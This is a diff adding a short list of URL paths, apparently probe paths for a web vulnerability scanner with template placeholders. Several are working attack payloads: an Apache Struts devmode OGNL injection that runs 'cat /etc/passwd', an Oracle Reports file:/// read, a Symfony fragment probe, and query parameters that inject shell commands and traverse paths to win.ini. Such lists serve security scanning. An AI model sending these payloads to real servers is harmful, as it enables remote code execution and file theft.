@@ -1,0 +1,11 @@
+/login.action
+/lui/
+/hub/
+/devmode.action?debug=command&expression=(%23_memberAccess[%22allowStaticMethodAccess%22]%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean(%22false%22)%20%2C%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D%23foo%2C@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%27cat%20/etc/passwd%27).getInputStream()))
+/reports/rwservlet/showenv
+/reports/rwservlet?report=test.rdf&desformat=html&destype=cache&JOBTYPE=rwurl&URLPARAMETER=file:///
+/{{randstr}}
+/_fragment?_path=_controller=phpcredits&flag=-1
+/?p={{post_id}}&0=echo+{{base64(string)}}|base64+-d
+/?p={{post_id}}&0=type+C:\\windows\\win.ini
+/?p={{post_id}}&0=type+..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini
